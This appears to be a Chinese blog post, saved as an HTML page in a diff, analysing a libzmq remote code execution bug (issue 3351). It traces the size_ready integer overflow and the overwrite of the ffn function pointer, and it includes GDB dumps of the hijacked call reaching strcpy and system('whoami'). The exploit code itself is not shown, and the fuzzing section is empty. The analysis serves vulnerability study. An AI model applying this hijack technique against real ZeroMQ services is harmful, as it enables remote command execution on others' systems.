@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>libzmq 远程代码执行 | Hello</title>
+    <meta name="description" content="1">
+    
+    
+    <link rel="preload" href="/assets/css/0.styles.153793e6.css" as="style"><link rel="preload" href="/assets/js/app.fb63a1b9.js" as="script"><link rel="preload" href="/assets/js/19.a31276f8.js" as="script"><link rel="prefetch" href="/assets/js/10.6aae25a8.js"><link rel="prefetch" href="/assets/js/11.e5a6ecb1.js"><link rel="prefetch" href="/assets/js/12.e6734d6c.js"><link rel="prefetch" href="/assets/js/13.c45be31f.js"><link rel="prefetch" href="/assets/js/14.7fe2edb8.js"><link rel="prefetch" href="/assets/js/15.7d96271b.js"><link rel="prefetch" href="/assets/js/16.d5c5556b.js"><link rel="prefetch" href="/assets/js/17.1a634ded.js"><link rel="prefetch" href="/assets/js/18.e6787f4e.js"><link rel="prefetch" href="/assets/js/2.6cf84733.js"><link rel="prefetch" href="/assets/js/20.f1ebd130.js"><link rel="prefetch" href="/assets/js/21.9fd25a7d.js"><link rel="prefetch" href="/assets/js/22.7ec64c15.js"><link rel="prefetch" href="/assets/js/23.a0a7d0ea.js"><link rel="prefetch" href="/assets/js/24.c17f3010.js"><link rel="prefetch" href="/assets/js/25.9bbf45e5.js"><link rel="prefetch" href="/assets/js/26.4f930016.js"><link rel="prefetch" href="/assets/js/27.b6d66343.js"><link rel="prefetch" href="/assets/js/28.ded43c8f.js"><link rel="prefetch" href="/assets/js/29.35b25580.js"><link rel="prefetch" href="/assets/js/3.88ebc755.js"><link rel="prefetch" href="/assets/js/30.a0b7fe3b.js"><link rel="prefetch" href="/assets/js/31.89d75be7.js"><link rel="prefetch" href="/assets/js/32.d7c054e6.js"><link rel="prefetch" href="/assets/js/33.9a5f3e99.js"><link rel="prefetch" href="/assets/js/34.ee5cfb6f.js"><link rel="prefetch" href="/assets/js/35.2054ab64.js"><link rel="prefetch" href="/assets/js/36.73bb48c1.js"><link rel="prefetch" href="/assets/js/37.5a1d6d20.js"><link rel="prefetch" href="/assets/js/38.c7d42097.js"><link rel="prefetch" href="/assets/js/39.fd864930.js"><link rel="prefetch" href="/assets/js/4.dc8e7db2.js"><link rel="prefetch" href="/assets/js/40.6c289e11.js"><link rel="prefetch" href="/assets/js/41.0ed23031.js"><link rel="prefetch" href="/assets/js/42.10b887da.js"><link rel="prefetch" href="/assets/js/43.d348e521.js"><link rel="prefetch" href="/assets/js/44.f98660b8.js"><link rel="prefetch" href="/assets/js/45.a141b3d0.js"><link rel="prefetch" href="/assets/js/46.3a3b1b86.js"><link rel="prefetch" href="/assets/js/47.d2f1996d.js"><link rel="prefetch" href="/assets/js/48.0bd12b2f.js"><link rel="prefetch" href="/assets/js/5.6adfd92b.js"><link rel="prefetch" href="/assets/js/6.f9bcea16.js"><link rel="prefetch" href="/assets/js/7.ad2cffde.js"><link rel="prefetch" href="/assets/js/8.8932bce4.js"><link rel="prefetch" href="/assets/js/9.892cc635.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.153793e6.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="page-main"><div class="component-nav-menu"><div class="placeholder"></div> <div class="search-wrapper"><div aria-haspopup="listbox" role="combobox" aria-owns="el-autocomplete-7854" class="el-autocomplete"><div class="el-input el-input--prefix"><!----><input type="text" autocomplete="off" valueKey="title" placeholder="请输入内容" fetchSuggestions="function () { [native code] }" triggerOnFocus="true" debounce="300" placement="bottom-start" popperAppendToBody="true" background-color="#eee" class="el-input__inner"><span class="el-input__prefix"><i class="el-input__icon el-icon-search"></i></span><!----><!----><!----></div><div role="region" class="el-autocomplete-suggestion el-popper" style="width:;display:none;"><div class="el-scrollbar"><div class="el-autocomplete-suggestion__wrap el-scrollbar__wrap el-scrollbar__wrap--hidden-default"><ul class="el-scrollbar__view el-autocomplete-suggestion__list"></ul></div><div class="el-scrollbar__bar is-horizontal"><div class="el-scrollbar__thumb" style="width:0;transform:translateX(0%);ms-transform:translateX(0%);webkit-transform:translateX(0%);"></div></div><div class="el-scrollbar__bar is-vertical"><div class="el-scrollbar__thumb" style="height:0;transform:translateY(0%);ms-transform:translateY(0%);webkit-transform:translateY(0%);"></div></div></div></div></div></div> <ul role="menubar" class="el-menu--horizontal el-menu" style="background-color:;"><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        Home
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        Blog
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        TimeLine
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        Github
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        About
+      </li></ul></div> <div class="page-container"><div class="component-page"><div class="page-content"><!----> <div class="content custom"><h2 id="_0x1-编译"><a href="#_0x1-编译" aria-hidden="true" class="header-anchor">#</a> 0x1 编译</h2> <p>漏洞作者在github给出了self-exploit，首先编译这个exploit。</p> <ul><li>exp地址：https://github.com/zeromq/libzmq/issues/3351*</li></ul> <p>直接在github clone libzmq源码，回滚到存在漏洞的版本。</p> <ul><li>git clone https://github.com/zeromq/libzmq.git</li></ul> <p>在zeromq主页中找到cppzmq，直接git clone。</p> <ul><li>cppzmq is a C++ binding for libzmq</li> <li>git clone https://github.com/zeromq/cppzmq</li></ul> <p>按照cppzmq的安装方式编译安装libzmq和cppzmq。安装完成之后编译作者给出的self-exploit。</p> <h2 id="_0x2-漏洞分析"><a href="#_0x2-漏洞分析" aria-hidden="true" class="header-anchor">#</a> 0x2 漏洞分析</h2> <p>漏洞发生在v2_decoder.cpp:117行size_ready函数，当 msg_size 特别大的时候，read_pos_ + msg_size 发生溢出，跳过程序原有的判断。</p> <div class="language- extra-class"><pre class="language-text"><code>if (unlikely (!_zero_copy
+                  || ((unsigned char *) read_pos_ + msg_size_
+                      &gt; (allocator.data () + allocator.size ())))){
+                      
+						...
+						...
+						...
+                      
+ } else{
+ 						...
+ 						...
+ 						...
+ }
+</code></pre></div><p>msg_size 是数据包中发送数据的长度。</p> <p>在函数in_event中，利用tcp_read读取数据，随后用decode解析数据。</p> <div class="language- extra-class"><pre class="language-text"><code>.....
+
+const int rc = tcp_read (_s, _inpos, bufsize);
+
+.....
+
+_decoder-&gt;decode (_inpos, _insize, processed);
+
+.....
+</code></pre></div><p>根据输入的第1个字节，判断接下来调用哪个函数。这里选择eight_byte_size_ready。</p> <div class="language- extra-class"><pre class="language-text"><code>int zmq::v2_decoder_t::flags_ready (unsigned char const *)
+{
+    _msg_flags = 0;
+    if (_tmpbuf[0] &amp; v2_protocol_t::more_flag)
+        _msg_flags |= msg_t::more;
+    if (_tmpbuf[0] &amp; v2_protocol_t::command_flag)
+        _msg_flags |= msg_t::command;
+
+    //  The payload length is either one or eight bytes,
+    //  depending on whether the 'large' bit is set.
+    if (_tmpbuf[0] &amp; v2_protocol_t::large_flag)
+        next_step (_tmpbuf, 8, &amp;v2_decoder_t::eight_byte_size_ready);
+    else
+        next_step (_tmpbuf, 1, &amp;v2_decoder_t::one_byte_size_ready);
+
+    return 0;
+}
+</code></pre></div><p>在eight_byte_size_ready函数中，利用get_uint64将接下来的8字节转换成int，就是传入消息的长度。最后调用size_ready函数触发溢出。</p> <div class="language- extra-class"><pre class="language-text"><code>
+int zmq::v2_decoder_t::eight_byte_size_ready (unsigned char const *read_from_)
+{
+    //  The payload size is encoded as 64-bit unsigned integer.
+    //  The most significant byte comes first.
+    const uint64_t msg_size = get_uint64 (_tmpbuf);
+
+    return size_ready (msg_size, read_from_);
+}
+</code></pre></div><h2 id="_0x3-漏洞利用"><a href="#_0x3-漏洞利用" aria-hidden="true" class="header-anchor">#</a> 0x3 漏洞利用</h2> <p>size_ready 函数中。当接收数据的长度大于之前分配的内存的时候，程序重新分配内存。但是之前的判断可控，当msg_size_特别大的时候不去重新分配内存。这样在下一次tcp_read接收数据时发生溢出。</p> <div class="language- extra-class"><pre class="language-text"><code>if (unlikely (!_zero_copy
+                  || ((unsigned char *) read_pos_ + msg_size_
+                      &gt; (allocator.data () + allocator.size ())))) {
+        // a new message has started, but the size would exceed the pre-allocated arena
+        // this happens every time when a message does not fit completely into the buffer
+        rc = _in_progress.init_size (static_cast&lt;size_t&gt; (msg_size_));
+    } else {
+        // construct message using n bytes from the buffer as storage
+        // increase buffer ref count
+        // if the message will be a large message, pass a valid refcnt memory location as well
+        rc =
+          _in_progress.init (const_cast&lt;unsigned char *&gt; (read_pos_),
+                             static_cast&lt;size_t&gt; (msg_size_),
+                             shared_message_memory_allocator::call_dec_ref,
+                             allocator.buffer (), allocator.provide_content ());
+
+        // For small messages, data has been copied and refcount does not have to be increased
+        if (_in_progress.is_zcmsg ()) {
+            allocator.advance_content ();
+            allocator.inc_ref ();
+        }
+    }
+</code></pre></div><p>data内存布局：</p> <p>size_ready函数调用_i_progress.init后，最终调用init_external_storage函数。</p> <p>data + the struct content_t 是一个单链表，在init_external_storage函数中将data_地址、size_、函数指针ffn_ 和hint_放到data 后边。这样当再一次接受数据时可以覆盖后边的函数指针和他的参数。</p> <ul><li>ffn_是一个函数指针，当连接关闭的时候调用。</li></ul> <div class="language- extra-class"><pre class="language-text"><code>struct content_t
+    {
+        void *data;
+        size_t size;
+        msg_free_fn *ffn;
+        void *hint;
+        zmq::atomic_counter_t refcnt;
+    };
+
+int zmq::msg_t::init_external_storage
+{
+    zmq_assert (NULL != data_);
+    zmq_assert (NULL != content_);
+
+    _u.zclmsg.metadata = NULL;
+    _u.zclmsg.type = type_zclmsg;
+    _u.zclmsg.flags = 0;
+    _u.zclmsg.group[0] = '\0';
+    _u.zclmsg.routing_id = 0;
+
+    _u.zclmsg.content = content_;
+    _u.zclmsg.content-&gt;data = data_;
+    _u.zclmsg.content-&gt;size = size_;
+    _u.zclmsg.content-&gt;ffn = ffn_;
+    _u.zclmsg.content-&gt;hint = hint_;
+    new (&amp;_u.zclmsg.content-&gt;refcnt) zmq::atomic_counter_t ();
+
+    return 0;
+}
+</code></pre></div><p><img src="/assets/img/libzmq-gdb.1cdc43f5.png" alt="avatar"></p> <p>在作者的self-exploit中，一个线程调用zmp，一个线程发送数据。这样就可以确定strcpy、system的地址，不需要考虑aslr。</p> <p>call strcpy</p> <div class="language- extra-class"><pre class="language-text"><code>$rax   : 0x00007f82559f7540  →  &lt;__strcpy_sse2_unaligned+0&gt; mov rcx, rsi
+$rbx   : 0x0               
+$rcx   : 0x0000555a71846020  →  0x0000696d616f6877 (&quot;whoami&quot;?)
+$rdx   : 0x0000555a718460c0  →  0x0000000000000000
+$rsp   : 0x00007f824fffdff0  →  0x0000000000000000
+$rbp   : 0x00007f824fffe010  →  0x00007f824fffe040  →  0x00007f824fffe060  →  0x00007f824fffe0b0  →  0x00007f824fffe0d0  →  0x00007f824fffe150  →  0x00007f824fffe1a0  →  0x00007f824fffee00
+$rsi   : 0x0000555a71846020  →  0x0000696d616f6877 (&quot;whoami&quot;?)
+$rdi   : 0x0000555a718460c0  →  0x0000000000000000
+$rip   : 0x00007f82565de009  →  &lt;zmq::msg_t::close()+441&gt; call rax
+$r8    : 0x0               
+$r9    : 0x0               
+$r10   : 0x9               
+$r11   : 0x00007f825662174a  →  &lt;zmq::v2_decoder_t::~v2_decoder_t()+0&gt; push rbp
+$r12   : 0x00007f824fffefc0  →  0x0000000000000000
+$r13   : 0x0               
+$r14   : 0x00007f8250004f98  →  0x00007f82565efa6a  →  &lt;zmq::worker_poller_base_t::worker_routine(void*)+0&gt; push rbp
+$r15   : 0x00007f8255399910  →  0x00007f8255399950  →  0x00007f82553999a0  →  0x00007f8255399a40  →  0x0000000100000009
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007f824fffdff0│+0x0000: 0x0000000000000000	 ← $rsp
+0x00007f824fffdff8│+0x0008: 0x00007f824800ba98  →  0x0000000000000000
+0x00007f824fffe000│+0x0010: 0x00007f824fffe020  →  0x00007f824fffe060  →  0x00007f824fffe0b0  →  0x00007f824fffe0d0  →  0x00007f824fffe150  →  0x00007f824fffe1a0  →  0x00007f824fffee00
+0x00007f824fffe008│+0x0018: 0x0000000000000000
+0x00007f824fffe010│+0x0020: 0x00007f824fffe040  →  0x00007f824fffe060  →  0x00007f824fffe0b0  →  0x00007f824fffe0d0  →  0x00007f824fffe150  →  0x00007f824fffe1a0  →  0x00007f824fffee00	 ← $rbp
+0x00007f824fffe018│+0x0028: 0x00007f8256621778  →  &lt;zmq::v2_decoder_t::~v2_decoder_t()+46&gt; mov DWORD PTR [rbp-0xc], eax
+0x00007f824fffe020│+0x0030: 0x00007f824fffe060  →  0x00007f824fffe0b0  →  0x00007f824fffe0d0  →  0x00007f824fffe150  →  0x00007f824fffe1a0  →  0x00007f824fffee00  →  0x00007f824fffee20
+0x00007f824fffe028│+0x0038: 0x00007f824800ba30  →  0x00007f825687a230  →  0x00007f825662174a  →  &lt;zmq::v2_decoder_t::~v2_decoder_t()+0&gt; push rbp
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7f82565de000 &lt;zmq::msg_t::close()+432&gt; mov    rdx, QWORD PTR [rdx]
+   0x7f82565de003 &lt;zmq::msg_t::close()+435&gt; mov    rsi, rcx
+   0x7f82565de006 &lt;zmq::msg_t::close()+438&gt; mov    rdi, rdx
+ → 0x7f82565de009 &lt;zmq::msg_t::close()+441&gt; call   rax
+   0x7f82565de00b &lt;zmq::msg_t::close()+443&gt; mov    rax, QWORD PTR [rbp-0x18]
+   0x7f82565de00f &lt;zmq::msg_t::close()+447&gt; mov    rax, QWORD PTR [rax]
+   0x7f82565de012 &lt;zmq::msg_t::close()+450&gt; test   rax, rax
+   0x7f82565de015 &lt;zmq::msg_t::close()+453&gt; je     0x7f82565de05c &lt;zmq::msg_t::close()+524&gt;
+   0x7f82565de017 &lt;zmq::msg_t::close()+455&gt; mov    rax, QWORD PTR [rbp-0x18]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
+*0x7f82559f7540 (
+   $rdi = 0x0000555a718460c0 → 0x0000000000000000,
+   $rsi = 0x0000555a71846020 → 0x0000696d616f6877 (&quot;whoami&quot;?),
+   $rdx = 0x0000555a718460c0 → 0x0000000000000000,
+   $rcx = 0x0000555a71846020 → 0x0000696d616f6877 (&quot;whoami&quot;?)
+)
+─────────────────────────────────────────────────────────────────────────────────────────────────── source:/home/fan/github/libzmq/src/msg.cpp+250 ────
+    245	             || !_u.zclmsg.content-&gt;refcnt.sub (1)) {
+    246	             //  We used &quot;placement new&quot; operator to initialize the reference
+    247	             //  counter so we call the destructor explicitly now.
+    248	             _u.zclmsg.content-&gt;refcnt.~atomic_counter_t ();
+    249	 
+ →  250	             _u.zclmsg.content-&gt;ffn (_u.zclmsg.content-&gt;data,
+    251	                                     _u.zclmsg.content-&gt;hint);
+    252	         }
+    253	     }
+    254	 
+    255	     if (_u.base.metadata != NULL) {
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;demo&quot;, stopped, reason: SINGLE STEP
+[#1] Id 2, Name: &quot;demo&quot;, stopped, reason: SINGLE STEP
+[#2] Id 3, Name: &quot;ZMQbg/0&quot;, stopped, reason: SINGLE STEP
+[#3] Id 4, Name: &quot;ZMQbg/1&quot;, stopped, reason: SINGLE STEP
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x7f82565de009 → zmq::msg_t::close(this=0x7f824800ba98)
+[#1] 0x7f8256621778 → zmq::v2_decoder_t::~v2_decoder_t(this=0x7f824800ba30, __in_chrg=&lt;optimized out&gt;)
+[#2] 0x7f8256621810 → zmq::v2_decoder_t::~v2_decoder_t(this=0x7f824800ba30, __in_chrg=&lt;optimized out&gt;)
+[#3] 0x7f8256611c7f → zmq::stream_engine_t::~stream_engine_t(this=0x7f8248000b40, __in_chrg=&lt;optimized out&gt;)
+[#4] 0x7f8256611d4e → zmq::stream_engine_t::~stream_engine_t(this=0x7f8248000b40, __in_chrg=&lt;optimized out&gt;)
+[#5] 0x7f82566163e8 → zmq::stream_engine_t::error(this=0x7f8248000b40, reason_=zmq::stream_engine_t::connection_error)
+[#6] 0x7f8256612856 → zmq::stream_engine_t::in_event(this=0x7f8248000b40)
+[#7] 0x7f82565d13f0 → zmq::epoll_t::loop(this=0x7f8250004f40)
+[#8] 0x7f82565efa8d → zmq::worker_poller_base_t::worker_routine(arg_=0x7f8250004f40)
+[#9] 0x7f825661c13c → thread_routine(arg_=0x7f8250004f98)
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+</code></pre></div><p>call system</p> <div class="language- extra-class"><pre class="language-text"><code>$rax   : 0x00007f82562e5770  →  &lt;system_compat+0&gt; jmp 0x7f82562d87e0 &lt;__libc_system@plt&gt;
+$rbx   : 0x0               
+$rcx   : 0x0               
+$rdx   : 0x0000555a718460c0  →  0x0000696d616f6877 (&quot;whoami&quot;?)
+$rsp   : 0x00007f824fffdff0  →  0x0000000000000000
+$rbp   : 0x00007f824fffe010  →  0x00007f824fffe040  →  0x00007f824fffe060  →  0x00007f824fffe0b0  →  0x00007f824fffe0d0  →  0x00007f824fffe150  →  0x00007f824fffe1a0  →  0x00007f824fffee00
+$rsi   : 0x0               
+$rdi   : 0x0000555a718460c0  →  0x0000696d616f6877 (&quot;whoami&quot;?)
+$rip   : 0x00007f82565de009  →  &lt;zmq::msg_t::close()+441&gt; call rax
+$r8    : 0x0               
+$r9    : 0x0               
+$r10   : 0x00007f8248001134  →  0x4800113000000005
+$r11   : 0x0               
+$r12   : 0x00007f824fffefc0  →  0x0000000000000000
+$r13   : 0x0               
+$r14   : 0x00007f8250004f98  →  0x00007f82565efa6a  →  &lt;zmq::worker_poller_base_t::worker_routine(void*)+0&gt; push rbp
+$r15   : 0x00007f8255399910  →  0x00007f8255399950  →  0x00007f82553999a0  →  0x00007f8255399a40  →  0x0000000100000009
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007f824fffdff0│+0x0000: 0x0000000000000000	 ← $rsp
+0x00007f824fffdff8│+0x0008: 0x00007f824800ba98  →  0x0000000000000000
+0x00007f824fffe000│+0x0010: 0x00007f824fffe020  →  0x00007f824fffe060  →  0x00007f824fffe0b0  →  0x00007f824fffe0d0  →  0x00007f824fffe150  →  0x00007f824fffe1a0  →  0x00007f824fffee00
+0x00007f824fffe008│+0x0018: 0x0000000000000000
+0x00007f824fffe010│+0x0020: 0x00007f824fffe040  →  0x00007f824fffe060  →  0x00007f824fffe0b0  →  0x00007f824fffe0d0  →  0x00007f824fffe150  →  0x00007f824fffe1a0  →  0x00007f824fffee00	 ← $rbp
+0x00007f824fffe018│+0x0028: 0x00007f8256621778  →  &lt;zmq::v2_decoder_t::~v2_decoder_t()+46&gt; mov DWORD PTR [rbp-0xc], eax
+0x00007f824fffe020│+0x0030: 0x00007f824fffe060  →  0x00007f824fffe0b0  →  0x00007f824fffe0d0  →  0x00007f824fffe150  →  0x00007f824fffe1a0  →  0x00007f824fffee00  →  0x00007f824fffee20
+0x00007f824fffe028│+0x0038: 0x00007f824800ba30  →  0x00007f825687a230  →  0x00007f825662174a  →  &lt;zmq::v2_decoder_t::~v2_decoder_t()+0&gt; push rbp
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7f82565de000 &lt;zmq::msg_t::close()+432&gt; mov    rdx, QWORD PTR [rdx]
+   0x7f82565de003 &lt;zmq::msg_t::close()+435&gt; mov    rsi, rcx
+   0x7f82565de006 &lt;zmq::msg_t::close()+438&gt; mov    rdi, rdx
+ → 0x7f82565de009 &lt;zmq::msg_t::close()+441&gt; call   rax
+   0x7f82565de00b &lt;zmq::msg_t::close()+443&gt; mov    rax, QWORD PTR [rbp-0x18]
+   0x7f82565de00f &lt;zmq::msg_t::close()+447&gt; mov    rax, QWORD PTR [rax]
+   0x7f82565de012 &lt;zmq::msg_t::close()+450&gt; test   rax, rax
+   0x7f82565de015 &lt;zmq::msg_t::close()+453&gt; je     0x7f82565de05c &lt;zmq::msg_t::close()+524&gt;
+   0x7f82565de017 &lt;zmq::msg_t::close()+455&gt; mov    rax, QWORD PTR [rbp-0x18]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
+*0x7f82562e5770 (
+   $rdi = 0x0000555a718460c0 → 0x0000696d616f6877 (&quot;whoami&quot;?),
+   $rsi = 0x0000000000000000,
+   $rdx = 0x0000555a718460c0 → 0x0000696d616f6877 (&quot;whoami&quot;?),
+   $rcx = 0x0000000000000000
+)
+─────────────────────────────────────────────────────────────────────────────────────────────────── source:/home/fan/github/libzmq/src/msg.cpp+250 ────
+    245	             || !_u.zclmsg.content-&gt;refcnt.sub (1)) {
+    246	             //  We used &quot;placement new&quot; operator to initialize the reference
+    247	             //  counter so we call the destructor explicitly now.
+    248	             _u.zclmsg.content-&gt;refcnt.~atomic_counter_t ();
+    249	 
+ →  250	             _u.zclmsg.content-&gt;ffn (_u.zclmsg.content-&gt;data,
+    251	                                     _u.zclmsg.content-&gt;hint);
+    252	         }
+    253	     }
+    254	 
+    255	     if (_u.base.metadata != NULL) {
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;demo&quot;, stopped, reason: SINGLE STEP
+[#1] Id 2, Name: &quot;demo&quot;, stopped, reason: SINGLE STEP
+[#2] Id 3, Name: &quot;ZMQbg/0&quot;, stopped, reason: SINGLE STEP
+[#3] Id 4, Name: &quot;ZMQbg/1&quot;, stopped, reason: SINGLE STEP
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x7f82565de009 → zmq::msg_t::close(this=0x7f824800ba98)
+[#1] 0x7f8256621778 → zmq::v2_decoder_t::~v2_decoder_t(this=0x7f824800ba30, __in_chrg=&lt;optimized out&gt;)
+[#2] 0x7f8256621810 → zmq::v2_decoder_t::~v2_decoder_t(this=0x7f824800ba30, __in_chrg=&lt;optimized out&gt;)
+[#3] 0x7f8256611c7f → zmq::stream_engine_t::~stream_engine_t(this=0x7f8248000b40, __in_chrg=&lt;optimized out&gt;)
+[#4] 0x7f8256611d4e → zmq::stream_engine_t::~stream_engine_t(this=0x7f8248000b40, __in_chrg=&lt;optimized out&gt;)
+[#5] 0x7f82566163e8 → zmq::stream_engine_t::error(this=0x7f8248000b40, reason_=zmq::stream_engine_t::connection_error)
+[#6] 0x7f8256612856 → zmq::stream_engine_t::in_event(this=0x7f8248000b40)
+[#7] 0x7f82565d13f0 → zmq::epoll_t::loop(this=0x7f8250004f40)
+[#8] 0x7f82565efa8d → zmq::worker_poller_base_t::worker_routine(arg_=0x7f8250004f40)
+[#9] 0x7f825661c13c → thread_routine(arg_=0x7f8250004f98)
+</code></pre></div><h2 id="_0x4-fuzzing"><a href="#_0x4-fuzzing" aria-hidden="true" class="header-anchor">#</a> 0x4 Fuzzing</h2> <p>..........</p></div></div></div></div></div></div>
+    <script src="/assets/js/app.fb63a1b9.js" defer></script><script src="/assets/js/19.a31276f8.js" defer></script>
+  </body>
+</html>
